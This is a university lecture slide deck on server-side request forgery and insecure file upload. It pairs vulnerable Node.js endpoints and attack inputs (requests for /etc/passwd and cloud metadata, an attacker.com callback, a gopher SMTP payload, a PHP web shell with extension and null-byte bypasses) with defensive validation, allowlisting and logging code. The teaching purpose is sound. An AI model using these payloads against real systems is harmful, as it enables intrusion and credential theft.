<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Session 9: WEB-SSRF-01 & WEB-UPLOAD-01 - SSRF & File Upload Security</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.3.1/dist/reveal.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.3.1/dist/theme/white.css">
    <style>
        /* Global slide styling */
        .reveal .slides section {
            text-align: left;
            padding: 20px;
            box-sizing: border-box;
            overflow-y: auto;
            max-height: 100vh;
        }

        .reveal .slides section.center {
            text-align: center;
        }

        /* Ensure content fits within viewport */
        .reveal .slides section h1 {
            font-size: 2.5em;
            margin-bottom: 0.5em;
        }

        .reveal .slides section h2 {
            font-size: 2em;
            margin-bottom: 0.5em;
        }

        .reveal .slides section h3 {
            font-size: 1.5em;
            margin-bottom: 0.5em;
        }

        .reveal .slides section p {
            font-size: 1.1em;
            line-height: 1.4;
            margin-bottom: 0.8em;
        }

        .reveal .slides section ul,
        .reveal .slides section ol {
            font-size: 1em;
            line-height: 1.4;
            margin-bottom: 0.8em;
        }

        .reveal .slides section li {
            margin-bottom: 0.3em;
        }

        /* Task box styling */
        .task-box {
            background: #e3f2fd;
            border: 2px solid #2196f3;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            max-height: 60vh;
            overflow-y: auto;
        }

        /* Code example styling */
        .code-example {
            background: #f5f5f5;
            border: 1px solid #ddd;
            border-radius: 5px;
            padding: 15px;
            font-family: 'Courier New', monospace;
            margin: 10px 0;
            font-size: 0.9em;
            line-height: 1.3;
            max-height: 40vh;
            overflow-y: auto;
        }

        /* Highlight styling */
        .highlight {
            background: #fff3cd;
            padding: 10px;
            border-radius: 5px;
            border-left: 4px solid #ffc107;
            margin: 10px 0;
        }

        /* Timeline info styling */
        .timeline-info {
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 8px;
            padding: 15px;
            margin: 20px 0;
            font-size: 0.9em;
        }

        .timeline-info ul {
            margin: 10px 0;
            padding-left: 20px;
        }

        .timeline-info li {
            margin-bottom: 0.2em;
        }

        /* OS³ Studio specific styling */
        .os3-studio {
            background: #e3f2fd;
            border: 2px solid #2196f3;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            max-height: 60vh;
            overflow-y: auto;
        }

        /* Vulnerability examples */
        .vulnerability {
            background: #ffebee;
            border: 2px solid #f44336;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            max-height: 60vh;
            overflow-y: auto;
        }

        /* Career focus styling */
        .career-box {
            background: #f0f8ff;
            border: 2px solid #007bff;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            max-height: 60vh;
            overflow-y: auto;
        }

        /* Demo links styling */
        .demo-link {
            background: #fff3cd;
            border: 2px solid #ffc107;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            max-height: 60vh;
            overflow-y: auto;
        }

        /* Responsive design */
        @media (max-width: 768px) {
            .reveal .slides section {
                padding: 15px;
            }

            .reveal .slides section h1 {
                font-size: 2em;
            }

            .reveal .slides section h2 {
                font-size: 1.6em;
            }

            .reveal .slides section h3 {
                font-size: 1.3em;
            }

            .task-box,
            .code-example {
                font-size: 0.9em;
                padding: 15px;
            }
        }

        /* Custom scrollbar for better UX */
        .reveal .slides section::-webkit-scrollbar,
        .task-box::-webkit-scrollbar,
        .code-example::-webkit-scrollbar {
            width: 8px;
        }

        .reveal .slides section::-webkit-scrollbar-track,
        .task-box::-webkit-scrollbar-track,
        .code-example::-webkit-scrollbar-track {
            background: #f1f1f1;
            border-radius: 4px;
        }

        .reveal .slides section::-webkit-scrollbar-thumb,
        .task-box::-webkit-scrollbar-thumb,
        .code-example::-webkit-scrollbar-thumb {
            background: #888;
            border-radius: 4px;
        }

        .reveal .slides section::-webkit-scrollbar-thumb:hover,
        .task-box::-webkit-scrollbar-thumb:hover,
        .code-example::-webkit-scrollbar-thumb:hover {
            background: #555;
        }

        /* Interactive content styling */
        .interactive-content {
            margin-top: 20px;
            text-align: center;
        }

        .interactive-content h3 {
            color: #2196f3;
            margin-bottom: 15px;
            font-size: 1.3em;
        }

        .video-container,
        .codepen-container {
            position: relative;
            width: 100%;
            max-width: 560px;
            margin: 0 auto;
        }

        .video-container iframe,
        .codepen-container iframe {
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            transition: transform 0.3s ease;
        }

        .video-container iframe:hover,
        .codepen-container iframe:hover {
            transform: scale(1.02);
        }

        .interactive-description {
            font-size: 0.9em;
            color: #666;
            margin-top: 10px;
            font-style: italic;
        }
    </style>
</head>

<body>
    <div style="position: fixed; top: 20px; left: 20px; z-index: 1000;">
        <a href="../index.html" style="
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 12px 20px;
                border-radius: 25px;
                text-decoration: none;
                font-weight: 600;
                font-size: 14px;
                box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
                transition: all 0.3s ease;
                display: inline-block;
            "
            onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 6px 20px rgba(102, 126, 234, 0.4)'"
            onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 4px 15px rgba(102, 126, 234, 0.3)'">
            ← Back to Module
        </a>
    </div>
    <div class="reveal">
        <div class="slides">
            <!-- Slide 1: Title -->
            <section class="center">
                <h1>WEB-SSRF-01 & WEB-UPLOAD-01</h1>
                <h2>SSRF & File Upload Security</h2>
                <h3>CMU540: Cyber Security - Session 9</h3>
                <p><strong>Birmingham Newman University</strong></p>
                <p><em>Lecturer: James Williams</em></p>
                <p>Understanding server-side request forgery and secure file handling</p>
                <p><small>3-hour session • 30 slides • 2 interactive tasks</small></p>
                <div class="timeline-info">
                    <p><strong>Session Timeline:</strong></p>
                    <ul>
                        <li>10 min: Registration & waiting</li>
                        <li>20 min: Opening slides</li>
                        <li>45 min: Task 1</li>
                        <li>15 min: Break/Catch up</li>
                        <li>20 min: Secondary slides</li>
                        <li>45 min: Task 2</li>
                        <li>Remaining: Self-study</li>
                    </ul>
                </div>
            </section>

            <!-- Slide 2: Learning Objectives -->
            <section>
                <h2>Learning Objectives</h2>
                <ul>
                    <li>Understand OWASP A10: SSRF and File Upload Security</li>
                    <li>Identify SSRF attack vectors and prevention methods</li>
                    <li>Learn secure file upload practices</li>
                    <li>Practice vulnerability discovery using OS³ Studio</li>
                    <li>Implement secure SSRF protection and file handling</li>
                    <li>Explore career opportunities in web security</li>
                </ul>
            </section>

            <!-- Slide 3: OWASP A10 & File Upload Overview -->
            <section>
                <h2>OWASP A10: SSRF & File Upload Security</h2>
                <div class="highlight">
                    <p><strong>SSRF:</strong> Server-Side Request Forgery forces the server to make requests to unintended locations</p>
                    <p><strong>File Upload:</strong> Insecure file upload can lead to remote code execution and data breaches</p>
                </div>
                <h3>Key Areas:</h3>
                <ul>
                    <li>SSRF attack techniques</li>
                    <li>File upload vulnerabilities</li>
                    <li>Input validation and sanitization</li>
                    <li>Secure file handling</li>
                </ul>
            </section>

            <!-- Slide 4: Real-World Impact -->
            <section>
                <h2>Real-World Impact</h2>
                <div class="vulnerability">
                    <h3>Notable Breaches:</h3>
                    <ul>
                        <li><strong>Capital One (2019):</strong> SSRF led to 100M records exposed</li>
                        <li><strong>GitHub (2019):</strong> SSRF vulnerability in webhooks</li>
                        <li><strong>Facebook (2013):</strong> File upload vulnerability exposed user data</li>
                    </ul>
                    <p><strong>Impact:</strong> Data breaches, server compromise, financial loss</p>
                </div>
            </section>

            <!-- Slide 5: SSRF Attack Techniques -->
            <section>
                <h2>SSRF Attack Techniques</h2>
                <h3>1. Basic SSRF</h3>
                <div class="code-example">
&lt;!-- VULNERABLE: SSRF --&gt;<br>
app.get('/fetch', (req, res) => {<br>
&nbsp;&nbsp;const url = req.query.url;<br>
&nbsp;&nbsp;fetch(url).then(response => {<br>
&nbsp;&nbsp;&nbsp;&nbsp;res.json(response);<br>
&nbsp;&nbsp;});<br>});<br><br>
&lt;!-- Attack --&gt;<br>
GET /fetch?url=http://localhost:22<br>
GET /fetch?url=file:///etc/passwd<br>
GET /fetch?url=http://169.254.169.254/latest/meta-data/
                </div>
                <h3>2. Blind SSRF</h3>
                <div class="code-example">
&lt;!-- VULNERABLE: Blind SSRF --&gt;<br>
app.post('/webhook', (req, res) => {<br>
&nbsp;&nbsp;const url = req.body.url;<br>
&nbsp;&nbsp;fetch(url); // No response returned<br>
&nbsp;&nbsp;res.json({ status: 'sent' });<br>});<br><br>
&lt;!-- Attack with external monitoring --&gt;<br>
POST /webhook<br>
{"url": "http://attacker.com/ssrf"}
                </div>
            </section>

            <!-- Slide 6: SSRF Attack Vectors -->
            <section>
                <h2>SSRF Attack Vectors</h2>
                <h3>1. Internal Network Scanning</h3>
                <div class="code-example">
&lt;!-- Internal network scanning --&gt;<br>
http://localhost:22      # SSH<br>
http://localhost:3306     # MySQL<br>
http://localhost:5432     # PostgreSQL<br>
http://localhost:6379     # Redis<br>
http://localhost:9200     # Elasticsearch<br><br>
&lt;!-- Cloud metadata endpoints --&gt;<br>
http://169.254.169.254/latest/meta-data/<br>
http://169.254.169.254/latest/user-data/
                </div>
                <h3>2. Protocol Smuggling</h3>
                <div class="code-example">
&lt;!-- Protocol smuggling --&gt;<br>
gopher://localhost:25/_HELO%20attacker.com%0AMAIL%20FROM:%20test@attacker.com%0ARCPT%20TO:%20victim@target.com%0ADATA%0ASubject:%20SSRF%20Test%0A%0AThis%20is%20a%20test%0A.%0AQUIT%0A<br><br>
&lt;!-- File access --&gt;<br>
file:///etc/passwd<br>
file:///etc/shadow<br>
file:///proc/self/environ
                </div>
            </section>

            <!-- Slide 7: File Upload Vulnerabilities -->
            <section>
                <h2>File Upload Vulnerabilities</h2>
                <h3>1. Unrestricted File Upload</h3>
                <div class="code-example">
&lt;!-- VULNERABLE: Unrestricted upload --&gt;<br>
app.post('/upload', upload.single('file'), (req, res) => {<br>
&nbsp;&nbsp;const file = req.file;<br>
&nbsp;&nbsp;res.json({<br>
&nbsp;&nbsp;&nbsp;&nbsp;filename: file.filename,<br>
&nbsp;&nbsp;&nbsp;&nbsp;path: file.path<br>
&nbsp;&nbsp;});<br>});<br><br>
&lt;!-- Malicious file --&gt;<br>
&lt;?php system($_GET['cmd']); ?&gt;  // shell.php
                </div>
                <h3>2. File Type Bypass</h3>
                <div class="code-example">
&lt;!-- VULNERABLE: MIME type check only --&gt;<br>
if (file.mimetype === 'image/jpeg') {<br>
&nbsp;&nbsp;allowUpload(file);<br>}<br><br>
&lt;!-- Bypass --&gt;<br>
Content-Type: image/jpeg<br>
&lt;?php system($_GET['cmd']); ?&gt;  // shell.php
                </div>
            </section>

            <!-- Slide 8: File Upload Attack Techniques -->
            <section>
                <h2>File Upload Attack Techniques</h2>
                <h3>1. Double Extension</h3>
                <div class="code-example">
&lt;!-- Double extension attack --&gt;<br>
shell.php.jpg<br>
shell.php.png<br>
shell.php.gif<br><br>
&lt;!-- Server processes as PHP --&gt;<br>
&lt;?php system($_GET['cmd']); ?&gt;
                </div>
                <h3>2. Null Byte Injection</h3>
                <div class="code-example">
&lt;!-- Null byte injection --&gt;<br>
shell.php%00.jpg<br>
shell.php\x00.jpg<br><br>
&lt;!-- Server truncates at null byte --&gt;<br>
filename: shell.php
                </div>
                <h3>3. Polyglot Files</h3>
                <div class="code-example">
&lt;!-- Polyglot file --&gt;<br>
GIF89a&lt;?php system($_GET['cmd']); ?&gt;<br><br>
&lt;!-- Valid GIF header + PHP code --&gt;
                </div>
            </section>

            <!-- Slide 9: Career Opportunities -->
            <section>
                <h2>Career Opportunities in Web Security</h2>
                <div class="career-box">
                    <h3>Web Security Roles:</h3>
                    <ul>
                        <li><strong>Web Application Security Engineer:</strong> £45,000 - £90,000</li>
                        <li><strong>Penetration Tester:</strong> £35,000 - £70,000</li>
                        <li><strong>Security Consultant:</strong> £50,000 - £100,000</li>
                        <li><strong>Bug Bounty Hunter:</strong> £30,000 - £150,000+</li>
                        <li><strong>Security Researcher:</strong> £40,000 - £80,000</li>
                    </ul>
                    <p><strong>Skills Needed:</strong> Web security, Penetration testing, Vulnerability assessment</p>
                </div>
            </section>

            <!-- Slide 10: OS³ Studio Introduction -->
            <section>
                <h2>OS³ Newman Cyber Security Lab</h2>
                <div class="os3-studio">
                    <h3>WEB-SSRF-01 & WEB-UPLOAD-01 Lab Environment</h3>
                    <p>Our OS³ Studio provides hands-on experience with:</p>
                    <ul>
                        <li>Applications vulnerable to SSRF attacks</li>
                        <li>Insecure file upload implementations</li>
                        <li>Secure implementation challenges</li>
                        <li>File handling best practices</li>
                    </ul>
                    <p><strong>Access:</strong> Available through university portal</p>
                </div>
            </section>

            <!-- Slide 11: Web Demos and Tools -->
            <section>
                <h2>Web Demos and Tools</h2>
                <div class="demo-link">
                    <h3>Security Testing Tools:</h3>
                    <ul>
                        <li><a href="https://portswigger.net/burp" target="_blank">Burp Suite</a> - Web application security testing</li>
                        <li><a href="https://github.com/OWASP/OWASP-ZAP" target="_blank">OWASP ZAP</a> - Open source web app scanner</li>
                        <li><a href="https://github.com/swisskyrepo/SSRFmap" target="_blank">SSRFmap</a> - SSRF exploitation tool</li>
                        <li><a href="https://github.com/OWASP/WebGoat" target="_blank">WebGoat</a> - Vulnerable web application</li>
                        <li><a href="https://pentesterlab.com/" target="_blank">PentesterLab</a> - Hands-on security training</li>
                    </ul>
                </div>
            </section>

            <!-- Slide 12: Case Study -->
            <section>
                <h2>Case Study: Capital One SSRF</h2>
                <div class="vulnerability">
                    <h3>2019 Capital One SSRF Breach</h3>
                    <ul>
                        <li><strong>Impact:</strong> 100 million records exposed</li>
                        <li><strong>Cause:</strong> SSRF vulnerability in AWS metadata service</li>
                        <li><strong>Method:</strong> Attacker used SSRF to obtain AWS credentials</li>
                        <li><strong>Cost:</strong> $190 million in settlements</li>
                    </ul>
                    <p><strong>Lesson:</strong> SSRF can lead to cloud infrastructure compromise</p>
                </div>
            </section>

            <!-- Slide 13: Summary of Vulnerabilities -->
            <section>
                <h2>Summary: Common SSRF & File Upload Issues</h2>
                <div class="highlight">
                    <h3>Key Vulnerabilities to Look For:</h3>
                    <ol>
                        <li>Unvalidated URL parameters</li>
                        <li>Missing input validation</li>
                        <li>Unrestricted file uploads</li>
                        <li>Insufficient file type checking</li>
                        <li>Missing file content validation</li>
                        <li>Insecure file storage</li>
                        <li>Missing access controls</li>
                    </ol>
                </div>
            </section>

            <!-- Task 1: Vulnerability Discovery -->
            <section>
                <h2>Task 1: SSRF & File Upload Vulnerability Discovery</h2>
                <div class="task-box">
                    <h3>Objective:</h3>
                    <p>Use OS³ Studio to identify SSRF vulnerabilities and insecure file upload implementations.</p>
                    
                    <h3>Instructions:</h3>
                    <ol>
                        <li>Access the OS³ Studio vulnerable application</li>
                        <li>Test for SSRF vulnerabilities in URL parameters</li>
                        <li>Attempt internal network scanning</li>
                        <li>Test for cloud metadata access</li>
                        <li>Look for unrestricted file uploads</li>
                        <li>Test file type bypass techniques</li>
                        <li>Document all findings with proof of concept</li>
                        <li>Prepare a vulnerability assessment report</li>
                    </ol>
                    <p><strong>Time:</strong> 45 minutes</p>
                    <p><em>Focus on systematic testing and thorough documentation</em></p>
                </div>
            </section>

            <!-- Slide 14: Break/Catch Up -->
            <section class="center">
                <h2>Break Time</h2>
                <div class="highlight">
                    <h3>15 Minutes</h3>
                    <p>Take a break, ask questions, or catch up on the previous task.</p>
                    <p><em>Next: Secure implementation and Task 2</em></p>
                </div>
            </section>

            <!-- Slide 15: Secure SSRF Protection -->
            <section>
                <h2>Secure SSRF Protection</h2>
                
                <h3>1. URL Validation</h3>
                <div class="code-example">
&lt;!-- SECURE: URL validation --&gt;<br>
function validateUrl(url) {<br>
&nbsp;&nbsp;try {<br>
&nbsp;&nbsp;&nbsp;&nbsp;const parsedUrl = new URL(url);<br>
&nbsp;&nbsp;&nbsp;&nbsp;// Block private IPs<br>
&nbsp;&nbsp;&nbsp;&nbsp;if (isPrivateIP(parsedUrl.hostname)) {<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;<br>
&nbsp;&nbsp;&nbsp;&nbsp;}<br>
&nbsp;&nbsp;&nbsp;&nbsp;// Allow only HTTP/HTTPS<br>
&nbsp;&nbsp;&nbsp;&nbsp;if (!['http:', 'https:'].includes(parsedUrl.protocol)) {<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;<br>
&nbsp;&nbsp;&nbsp;&nbsp;}<br>
&nbsp;&nbsp;&nbsp;&nbsp;return true;<br>
&nbsp;&nbsp;} catch {<br>
&nbsp;&nbsp;&nbsp;&nbsp;return false;<br>
&nbsp;&nbsp;}<br>}<br><br>
function isPrivateIP(hostname) {<br>
&nbsp;&nbsp;const privateRanges = [<br>
&nbsp;&nbsp;&nbsp;&nbsp;/^10\./, /^172\.(1[6-9]|2[0-9]|3[0-1])\./, /^192\.168\./,<br>
&nbsp;&nbsp;&nbsp;&nbsp;/^127\./, /^169\.254\./, /^::1$/, /^fc00:/, /^fe80:/<br>
&nbsp;&nbsp;];<br>
&nbsp;&nbsp;return privateRanges.some(range => range.test(hostname));<br>}
                </div>

                <h3>2. Allowlist Approach</h3>
                <div class="code-example">
&lt;!-- SECURE: Allowlist approach --&gt;<br>
const allowedDomains = [<br>
&nbsp;&nbsp;'api.example.com',<br>
&nbsp;&nbsp;'trusted-service.com'<br>];<br><br>
function isAllowedDomain(hostname) {<br>
&nbsp;&nbsp;return allowedDomains.includes(hostname);<br>}<br><br>
app.get('/fetch', (req, res) => {<br>
&nbsp;&nbsp;const url = req.query.url;<br>
&nbsp;&nbsp;if (!validateUrl(url) || !isAllowedDomain(new URL(url).hostname)) {<br>
&nbsp;&nbsp;&nbsp;&nbsp;return res.status(400).json({ error: 'Invalid URL' });<br>
&nbsp;&nbsp;}<br>
&nbsp;&nbsp;fetch(url).then(response => res.json(response));<br>});
                </div>
            </section>

            <!-- Slide 16: Secure File Upload -->
            <section>
                <h2>Secure File Upload Implementation</h2>
                
                <h3>1. File Type Validation</h3>
                <div class="code-example">
&lt;!-- SECURE: File type validation --&gt;<br>
const multer = require('multer');<br>
const path = require('path');<br><br>
const storage = multer.diskStorage({<br>
&nbsp;&nbsp;destination: 'uploads/',<br>
&nbsp;&nbsp;filename: (req, file, cb) => {<br>
&nbsp;&nbsp;&nbsp;&nbsp;const ext = path.extname(file.originalname);<br>
&nbsp;&nbsp;&nbsp;&nbsp;const name = crypto.randomBytes(16).toString('hex');<br>
&nbsp;&nbsp;&nbsp;&nbsp;cb(null, name + ext);<br>
&nbsp;&nbsp;}<br>});<br><br>
const upload = multer({<br>
&nbsp;&nbsp;storage: storage,<br>
&nbsp;&nbsp;fileFilter: (req, file, cb) => {<br>
&nbsp;&nbsp;&nbsp;&nbsp;const allowedTypes = ['.jpg', '.jpeg', '.png', '.gif'];<br>
&nbsp;&nbsp;&nbsp;&nbsp;const ext = path.extname(file.originalname).toLowerCase();<br>
&nbsp;&nbsp;&nbsp;&nbsp;if (allowedTypes.includes(ext)) {<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cb(null, true);<br>
&nbsp;&nbsp;&nbsp;&nbsp;} else {<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cb(new Error('Invalid file type'), false);<br>
&nbsp;&nbsp;&nbsp;&nbsp;}<br>
&nbsp;&nbsp;},<br>
&nbsp;&nbsp;limits: { fileSize: 5 * 1024 * 1024 } // 5MB<br>});
                </div>

                <h3>2. File Content Validation</h3>
                <div class="code-example">
&lt;!-- SECURE: File content validation --&gt;<br>
const fileType = require('file-type');<br><br>
async function validateFileContent(filePath) {<br>
&nbsp;&nbsp;const type = await fileType.fromFile(filePath);<br>
&nbsp;&nbsp;const allowedMimes = [<br>
&nbsp;&nbsp;&nbsp;&nbsp;'image/jpeg', 'image/png', 'image/gif'<br>
&nbsp;&nbsp;];<br>
&nbsp;&nbsp;return allowedMimes.includes(type.mime);<br>}<br><br>
app.post('/upload', upload.single('file'), async (req, res) => {<br>
&nbsp;&nbsp;if (!await validateFileContent(req.file.path)) {<br>
&nbsp;&nbsp;&nbsp;&nbsp;fs.unlinkSync(req.file.path);<br>
&nbsp;&nbsp;&nbsp;&nbsp;return res.status(400).json({ error: 'Invalid file content' });<br>
&nbsp;&nbsp;}<br>
&nbsp;&nbsp;res.json({ success: true, filename: req.file.filename });<br>});
                </div>
            </section>

            <!-- Slide 17: File Storage Security -->
            <section>
                <h2>File Storage Security</h2>
                
                <h3>1. Secure File Storage</h3>
                <div class="code-example">
&lt;!-- SECURE: File storage outside web root --&gt;<br>
const path = require('path');<br><br>
const storage = multer.diskStorage({<br>
&nbsp;&nbsp;destination: path.join(__dirname, '../uploads/'), // Outside web root<br>
&nbsp;&nbsp;filename: (req, file, cb) => {<br>
&nbsp;&nbsp;&nbsp;&nbsp;const ext = path.extname(file.originalname);<br>
&nbsp;&nbsp;&nbsp;&nbsp;const name = crypto.randomBytes(32).toString('hex');<br>
&nbsp;&nbsp;&nbsp;&nbsp;cb(null, name + ext);<br>
&nbsp;&nbsp;}<br>});<br><br>
// Serve files through secure endpoint<br>
app.get('/files/:filename', (req, res) => {<br>
&nbsp;&nbsp;const filename = req.params.filename;<br>
&nbsp;&nbsp;if (!isValidFilename(filename)) {<br>
&nbsp;&nbsp;&nbsp;&nbsp;return res.status(400).json({ error: 'Invalid filename' });<br>
&nbsp;&nbsp;}<br>
&nbsp;&nbsp;res.sendFile(path.join(__dirname, '../uploads/', filename));<br>});
                </div>

                <h3>2. File Access Controls</h3>
                <div class="code-example">
&lt;!-- SECURE: File access controls --&gt;<br>
app.get('/files/:filename', authenticateUser, (req, res) => {<br>
&nbsp;&nbsp;const filename = req.params.filename;<br>
&nbsp;&nbsp;const filePath = path.join(__dirname, '../uploads/', filename);<br><br>
&nbsp;&nbsp;// Check if user has access to this file<br>
&nbsp;&nbsp;if (!hasFileAccess(req.user.id, filename)) {<br>
&nbsp;&nbsp;&nbsp;&nbsp;return res.status(403).json({ error: 'Access denied' });<br>
&nbsp;&nbsp;}<br><br>
&nbsp;&nbsp;// Log file access<br>
&nbsp;&nbsp;logFileAccess(req.user.id, filename, req.ip);<br><br>
&nbsp;&nbsp;res.sendFile(filePath);<br>});
                </div>
            </section>

            <!-- Slide 18: Input Sanitization -->
            <section>
                <h2>Input Sanitization</h2>
                
                <h3>1. Filename Sanitization</h3>
                <div class="code-example">
&lt;!-- SECURE: Filename sanitization --&gt;<br>
function sanitizeFilename(filename) {<br>
&nbsp;&nbsp;// Remove path traversal attempts<br>
&nbsp;&nbsp;filename = filename.replace(/[\/\\]/g, '');<br>
&nbsp;&nbsp;// Remove null bytes<br>
&nbsp;&nbsp;filename = filename.replace(/\0/g, '');<br>
&nbsp;&nbsp;// Remove special characters<br>
&nbsp;&nbsp;filename = filename.replace(/[^a-zA-Z0-9.-]/g, '');<br>
&nbsp;&nbsp;// Limit length<br>
&nbsp;&nbsp;filename = filename.substring(0, 255);<br>
&nbsp;&nbsp;return filename;<br>}<br><br>
const upload = multer({<br>
&nbsp;&nbsp;storage: multer.diskStorage({<br>
&nbsp;&nbsp;&nbsp;&nbsp;filename: (req, file, cb) => {<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;const sanitized = sanitizeFilename(file.originalname);<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;const ext = path.extname(sanitized);<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;const name = crypto.randomBytes(16).toString('hex');<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cb(null, name + ext);<br>
&nbsp;&nbsp;&nbsp;&nbsp;}<br>
&nbsp;&nbsp;})<br>});
                </div>

                <h3>2. URL Sanitization</h3>
                <div class="code-example">
&lt;!-- SECURE: URL sanitization --&gt;<br>
function sanitizeUrl(url) {<br>
&nbsp;&nbsp;// Remove dangerous protocols<br>
&nbsp;&nbsp;url = url.replace(/^(file|gopher|ftp|ldap):/i, '');<br>
&nbsp;&nbsp;// Remove null bytes<br>
&nbsp;&nbsp;url = url.replace(/\0/g, '');<br>
&nbsp;&nbsp;// Remove control characters<br>
&nbsp;&nbsp;url = url.replace(/[\x00-\x1F\x7F]/g, '');<br>
&nbsp;&nbsp;return url;<br>}<br><br>
app.get('/fetch', (req, res) => {<br>
&nbsp;&nbsp;let url = req.query.url;<br>
&nbsp;&nbsp;url = sanitizeUrl(url);<br>
&nbsp;&nbsp;if (!validateUrl(url)) {<br>
&nbsp;&nbsp;&nbsp;&nbsp;return res.status(400).json({ error: 'Invalid URL' });<br>
&nbsp;&nbsp;}<br>
&nbsp;&nbsp;fetch(url).then(response => res.json(response));<br>});
                </div>
            </section>

            <!-- Slide 19: Monitoring and Logging -->
            <section>
                <h2>Monitoring and Logging</h2>
                
                <h3>1. Security Event Logging</h3>
                <div class="code-example">
&lt;!-- SECURE: Security logging --&gt;<br>
function logSecurityEvent(event, details) {<br>
&nbsp;&nbsp;const logEntry = {<br>
&nbsp;&nbsp;&nbsp;&nbsp;timestamp: new Date().toISOString(),<br>
&nbsp;&nbsp;&nbsp;&nbsp;event: event,<br>
&nbsp;&nbsp;&nbsp;&nbsp;userId: details.userId,<br>
&nbsp;&nbsp;&nbsp;&nbsp;ip: details.ip,<br>
&nbsp;&nbsp;&nbsp;&nbsp;userAgent: details.userAgent,<br>
&nbsp;&nbsp;&nbsp;&nbsp;details: details<br>
&nbsp;&nbsp;};<br>
&nbsp;&nbsp;securityLogger.warn(logEntry);<br>}<br><br>
// Log SSRF attempts<br>
app.get('/fetch', (req, res) => {<br>
&nbsp;&nbsp;const url = req.query.url;<br>
&nbsp;&nbsp;if (!validateUrl(url)) {<br>
&nbsp;&nbsp;&nbsp;&nbsp;logSecurityEvent('ssrf_attempt', {<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url: url,<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip: req.ip,<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;userAgent: req.headers['user-agent']<br>
&nbsp;&nbsp;&nbsp;&nbsp;});<br>
&nbsp;&nbsp;&nbsp;&nbsp;return res.status(400).json({ error: 'Invalid URL' });<br>
&nbsp;&nbsp;}<br>});
                </div>

                <h3>2. File Upload Monitoring</h3>
                <div class="code-example">
&lt;!-- SECURE: File upload monitoring --&gt;<br>
app.post('/upload', upload.single('file'), (req, res) => {<br>
&nbsp;&nbsp;logSecurityEvent('file_upload', {<br>
&nbsp;&nbsp;&nbsp;&nbsp;filename: req.file.originalname,<br>
&nbsp;&nbsp;&nbsp;&nbsp;size: req.file.size,<br>
&nbsp;&nbsp;&nbsp;&nbsp;mimetype: req.file.mimetype,<br>
&nbsp;&nbsp;&nbsp;&nbsp;ip: req.ip,<br>
&nbsp;&nbsp;&nbsp;&nbsp;userId: req.user.id<br>
&nbsp;&nbsp;});<br>
&nbsp;&nbsp;res.json({ success: true });<br>});
                </div>
            </section>

            <!-- Slide 20: Career Development -->
            <section>
                <h2>Career Development in Web Security</h2>
                <div class="career-box">
                    <h3>Next Steps:</h3>
                    <ul>
                        <li><strong>Advanced Certifications:</strong> OSWE, GWAPT, OSCP</li>
                        <li><strong>Specialized Training:</strong> Web application security, Penetration testing</li>
                        <li><strong>Hands-on Practice:</strong> Bug bounties, CTF competitions</li>
                        <li><strong>Industry Networking:</strong> Security conferences, meetups</li>
                        <li><strong>Research:</strong> New attack techniques, Defense methods</li>
                    </ul>
                    <p><strong>Resources:</strong> <a href="https://owasp.org/" target="_blank">OWASP</a> | <a href="https://portswigger.net/" target="_blank">PortSwigger</a> | <a href="https://pentesterlab.com/" target="_blank">PentesterLab</a></p>
                </div>
            </section>

            <!-- Task 2: Secure Implementation -->
            <section>
                <h2>Task 2: Secure SSRF Protection & File Upload Implementation</h2>
                <div class="task-box">
                    <h3>Objective:</h3>
                    <p>Use OS³ Studio to implement secure SSRF protection and file upload practices.</p>
                    
                    <h3>Instructions:</h3>
                    <ol>
                        <li>Access the OS³ Studio secure implementation environment</li>
                        <li>Implement URL validation and allowlisting</li>
                        <li>Add file type and content validation</li>
                        <li>Configure secure file storage outside web root</li>
                        <li>Implement file access controls</li>
                        <li>Add input sanitization and monitoring</li>
                        <li>Test the secure implementation</li>
                        <li>Document the security improvements</li>
                    </ol>
                    <p><strong>Time:</strong> 45 minutes</p>
                    <p><em>Focus on implementing industry-standard security practices</em></p>
                </div>
            </section>

            <!-- Slide 21: Further Activity -->
            <section>
                <h2>Further Activity: Code Inspection</h2>
                <div class="os3-studio">
                    <h3>Advanced Students - Code Analysis:</h3>
                    <p>For students with additional time, explore the source code to understand:</p>
                    <ul>
                        <li>How SSRF protection is implemented</li>
                        <li>File upload validation mechanisms</li>
                        <li>Input sanitization and validation</li>
                        <li>File storage and access controls</li>
                        <li>Security monitoring and logging</li>
                    </ul>
                    <p><strong>Deliverable:</strong> Code review report with security recommendations</p>
                </div>
            </section>

            <!-- Slide 22: Summary -->
            <section>
                <h2>Session Summary</h2>
                <div class="highlight">
                    <h3>Key Takeaways:</h3>
                    <ul>
                        <li>SSRF can lead to internal network compromise</li>
                        <li>File upload vulnerabilities can result in RCE</li>
                        <li>Input validation and sanitization are critical</li>
                        <li>OS³ Studio provides hands-on vulnerability testing</li>
                        <li>Secure implementation requires multiple layers of protection</li>
                        <li>Career opportunities in web security are growing</li>
                    </ul>
                </div>
            </section>

